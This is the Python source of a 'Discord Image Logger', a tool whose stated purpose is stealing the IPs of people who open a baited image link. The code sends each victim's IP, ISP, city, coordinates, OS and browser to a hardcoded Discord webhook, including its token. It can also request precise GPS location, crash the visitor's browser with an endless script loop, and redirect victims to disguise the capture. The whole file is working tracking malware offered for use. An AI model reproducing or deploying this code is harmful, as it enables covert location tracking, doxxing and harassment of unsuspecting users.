# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1132853773140774994/Z_Cy5e4DX9dxCSU94spAwrLgrX1vHv_OrGQCaKjjGD1GXPaiq7RZAsG6aDy_eAvo6VWG",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxITEhUSEhIVFRAWFxUVFRUVEg8PFRUVFRUXFhUVFRUYHSggGBolHRUVITEhJSkrLi4uFx8zODMtNygtLisBCgoKDg0OFxAQGi0dHR0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tK//AABEIAPwAyAMBIgACEQEDEQH/xAAbAAABBQEBAAAAAAAAAAAAAAAFAAIDBAYBB//EADUQAAIBAwMCAwUHBQADAAAAAAABAgMEEQUhMRJBBlFhEyJxgZEUIzJCUtHwFVOSocFygrH/xAAZAQADAQEBAAAAAAAAAAAAAAAAAQIDBAX/xAAeEQEBAQEAAwEBAQEAAAAAAAAAARECAxIhMRNRBP/aAAwDAQACEQMRAD8AgEjsRxyLIWRHQBrRzA8Q8DkToiOrcQj+KSQ5CSCA9x4joxzh5aBtx4r/AEx+o/W0a1QsmDqeIa7/ADYRWlrNb+4yvSjXoojzn+s1/wC4xLWq/wDcf1D+dLXo+CVM88oeIayazLPxL9PxZNLdL6BeD1tRGXtfF0fzx28w3a6tSqYxJfB7EXmwCCEcTOiBCEIn2MhHcHMBtBCOo4OUKSRDLrTzyiWLJACKlVTXqSZOVrXPDwyjVU499hX4cX8kdavGKy2gNKvU/V/ogrQcuXkXsfqV/rz4ht6gGvWlN5lJ/UJVLVIpVYYNOeoPUOqRGFuUSCUDaVFiMY0S9DOOJWliPAsD0jvSw0sMihwsCSAyJoSa4GxiPiiacF9P12rDZvqXqafTNbhUwuJeRiacSzTovsZdYr1eiJjomSsNRrRWPxL1C8NZ84mdwetGDjBsNXT/ACsd9vlLaEfmBZV6U0uWkIoq3b3luzo8BpIiNEgBNT3FUgsDKcifIwGXFknxsC69PpZoayAV8svBn1F81RlT6hr0/IWtrPC3LDoke2LZe501rdA6pS3NnXt8oE1tPbe25rz5P9TYAeyE6QXnZPjA1WDfYv8AoXqFxojvYBGVm15j1ZvGcB/Q/UJlSGxohRW2ew2dkw9y9Q90/QdTot8F+nYyfYvWVg090K+QeobRsp+RbjRkuUHFSQ2pRyjO9U4pW8S5Tt2+EVqLxPDDtFLBOaduIaGnrvuXVTSWyJIojqzNeYytdihFKvqsIbPkRp6xOuoeMQqvBmpPCGSTGCrplx1ZXkXKm4tGK9Zg+VJdWWXK88FWCyxdU4nTXYfFDYU8EsUZNXalLYq0oYluEGlgpXEN18RB24oxa4B8bfGTTWOnuWMIm1LQOmPWhyUaxk6bbDFG1xRy1vgrSptSxg0Lt800muw8paxsaOHsWPY5eGW42blPpQTtdFn1brYV09CYUcdjsVkLXtp0copUoIQcVIilHBdyVrhdxhRrW++UErZbFRlqhI05Z9LSK96+iLk/It0zP+LL3EfZp88mkSzV1Xc5NvzER29NyaRw1JvBMQjIKVrmFX0ewWnUxyUa2zT8mRahqUcNLklR86nU9ixGnhFHSKX5mE6kTK1pIjJYxIpbFimsok3YwJJ2OcP1RbtaGQ5a2KaHzNK3E+mW2IxXcLfZ01h7kdlQws/QvxgdXPPxz994zlz4bg5ZjwS19KxhLy8jQqInAv0R/Ss1puhKDcnzkLfZl6fQv9BG6YvQ/wClY7xFYt8IzqtZHomoUMoAXVqscGHk5b8dazLplerEJXVPGQfU5MWiL2BHH3ZblqJU1JYwyuamwRjPbPYw+t3HtKkmvgaulXTot+hjKFJzqY82b8pgt4asMvqYjT2FsqcEvTcRf6zqAQhsmZmparcYjjuULK27yJKjc578IsqcVtkjqtOYt2WywW3Iq2g+5nhGazl7z2CtrQwgdZ7LJbje4Cfv0DtjRz/PoaC1p7GKoaljuG9P19P3Wa8YjpqqKJyvbVk0mnsWEzq5cl/SEIQyI5I6ckAQXMMoC3NLlBq4qYTMndaylJoy7xr4w+9pbsDXEcBaveqXkD68kzk6/XTFSnIivN1g5F4eDtwtgMEunKCaT2ZV0OGaq+IYqRi1hlTTKKhV52NeKnr8apCFFiL1kojKvA8ZW4Jphlu92VKj3ZZpPGfmRwXJm1g1p69wfUoN8DdIaksGr0zSk92TJaduMxG3qY2RLpmj1K0+nhd2byNhFRax28gdoslSrShLbPGSfLLzzo5u0Or+DJJe7PLBl3oNxR97GV6bno045xu1h527+h2cE00+Dl58vWrsYXRvEEo4jI3NjdqaTTMPqdjFSco+Yf8ADUsxPS8Pdrm8vMxpos6R05Eh1SuYmyjqGoRprLLNaphZMr4oq+6vNk2q5m0P1TxI5+7BPPBnpWlaTz0y3NZ4Y0qEm5ySb7B6+jKMfuorqyuy4OLzd118csBV8PXMYdbjtzzlgyNaSe563Lj3vLf/AKYynpsatWculdOTHi23F35GV75LFWPumhvdBXMQHew6E0zXLE7rP9W/zJKkUmpECW+R9/UwkVJ9FaS1lmKYiDSqqlTWOwjZiYcqR2FkUuBAHhDMsfEl+zPOMBnw/p/XKTeNg5U06PWsIP56r3Z/R6TUt0eh6UtkwD9jUdw9p0tkac+PGfXkgo47ADV9Jc3mOU/NGipTyh7gg68ftMqePJjIW13c0sxx1erK+papctYxhenc2jt4vsQ1tPg+xz3/AJZutZ53nNa5q/mNF4PrNxlnsS6ppHU1GK27svafZqlHpRrx4/Uu+5YJW9XfcmlVSBdSvgYq+2f2NdZelq7c1c/BGM8V1n7RI0yq57gvWNO9piS5QVXMwJ0zVqlNrHHkaWhryay4PPoVtK0hNZaQZjpsfL/hy9+G9Nv6TkGv9SqVF0wjhPb1Lml2LjFeYRhZJcIm6cIvx+D1qO/Ns+B9xTWODB+IIbs315Iy19b9TZteNRz5P9YJwecYItUexsKWkqUjM+KKHRLpJnjxfvq/4dfufQ6N8Nr7v4iNE1Ijs+DiHNGEVRnwyvx/IO20cyYB8N/mD1rL3mdPMZd9fMcuo7lu0/CQVixbcFMdFLZ8Fwo0GXYSyTTiRITRzqE5ApWuI9ylOWEXbiXYE6hUwmRVc/VK4rbkbrbcg+VZ5HuexDoXrW4XUE4rcy6rYkjS2c00miojoXtoYRMR28tiXJUYVwhuZbEsincS2HE0Ou5Apw5CNyyrJFlLiG3huzB+N196jf2vLMX4rt+qpkF836k0Zfdo6P0yOIpHDNsgHegwltVmSMuYqiukrol8eQxP3Zp9mUaVHYuZ6oLPKOmObqrkmS0WVKM8r1LVJcDZrcJlqjVKiR1vBJiUKxIptguhUywpS4FVQ2rDZsxuvXD68ZNrU4PPtYm3VlnsTWvCvTky2U6EtwnOtDp2W5jf10hldbhvw7Xy+l9gHcTCXhd/eP4f8NOGfka6k2tyb243Gy+BXuJYWTTHJqepXKlWpkgp1eofgeErV9yrUeEXK0cA+5ll4KDlP3YuQJuLZSy2gtWWUor5inQ2wI4zSj0vB0dqSxLPYRnXTLsDmW9MXvFRlzS/xEeMd/jT2lLI+5t+ndfMfZLgvypZN3NQik98l+jNENS26XxsS0orAyXKckR3lVYG9O2SpeMQX7F9wpGrgA2FTYJQmGAQ600ZfXtCcpOcHt3D0JiqyXBNmL56rzupScXh9h7kGta0380TPwlJy6cbmVmV1c1PSt3N4Rq9B0f2a6ny/wDRBo2nKKUm9zQqWyRUZeTomynfSXSyWtVBt5V2NJHOZYVEpNMvSmALWXvsJb45GEl1UWAVnLyWq1Pbdj7Kyzu+Bh2ztn+J9zt3HYI9GEUrxCDJa1wxEut0tmIjr9dHP4BthDSI5ZkY3s13NZ4cqNrLFzxg66+NdZrYJ0kDbXgJ0DRhUroJlWpZ43RfpjxaQT7NkF1ReAzOBDUisD0ANOWCzTu8E1akmUJ0mngZLyvSOpqPr/sGVreXmUK9CWRVpxBO71DKxkoUXHq6mVHbs59nZm6WkttTSWMlyGoepj1RfmXbaM/MqMvJGiq3GQfcVckO5btbPO8voWwRWdFt5CUabLVCgl2LVOkLQG07Rt5fBehTwWfZjZrAtPFaZQuy/MoXQ4TP6qvdfzEd1f8ACxE10cfjzNmu8MS2MkH9AulHY0Z9PQbSWwSpSAtjXygnSmSzEqTJSrRkTwkSDxlWOxNSO1UI8BrhYIG8hSvSyCKnuywy5SSeyyMnZZJqc0WFVQzlxSWmfA5/S/h/ovut/NhirP0IytZ5FCel4Oq1wXpVPUhqzRUjPrrVf2aLlsm/gU4y6nhBq3pJIKk6ECzCGBtOPclJtVI5KWCCpI7ORDOQFaiqFGuWakihd1MIqEBa9USg8iAHi/UtuhMQNeWYRNGTXBHGQ4oNf4d1XOIS58zYW9RNHlFlX6JJm90e/U0t9wR1Gpoy3LUGDqEi5TmRUrcJDqkskUWOEeuSQOv7Xq3XISGygEJmZ0ZwI3eNcmkq0V3KlXS4vsWAT7f6i/qHqFJaJB9hv9CiI/gar9slhTnLj9glQ0uMd8blunbjJBp1l07vkJpDYolpoi04kjHA2qxOoRSYjtMmyGpIfORXqSKiUNWQA1u+UItv5BC9u8ZMF4jv3P3clQ5ADUarqzz2EKnDAgxrphKiIfAYPSDWiVnF8gVFiFTHAJr0jT75NchmhWR5jYao4tGw07UlJLfcViMamEiaMgZbXBcjVROEsiI4zO9Qgc8CTQyTOYHnwJDoyOw7qEC6UJI5k71AHRHGyOdQJNCRyI5zIZVSvWuF5jwJalQG313jhkF5qCXfBktb1ZvaL27sqQOa5qzbcYv5mfk88ilJsjlIa5DJciEcBSIkgiMkhwBuksOCIlp8AVSQZftK8o8MHFqjyNFbCw1FrCk+e4dt7xGPa/CH7flfD/gsR1cH6dclVUDqo0OjXf8AMhiJ3Bj2v8yd9qBalzJfxkf2yQsVOx2dzFctL4tIZ9sh+uP+Uf3MN4svZfd8fm7f+ICp15MPVU+vVvtkP1x/yj+4vtkP1x/yj+55e6r/AIkL2r/iQep49Olew/XH/KJXnfQ/XH/KJ5xKRXkx4Men1Lum1jrjGWNsyWGZ7UdQw5R60pL5/TBm6nHxS/0V6v45f+v/AMDBixdXak96se/cH3MY4yqkX8yKdrB491b5z9CKFrBy6cbZl8sArDHUXmROa819RajRioZUVnzBZN6xcminWvNfVCBYhex+r//Z", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 2, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://www.youtube.com/watch?v=dQw4w9WgXcQ" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
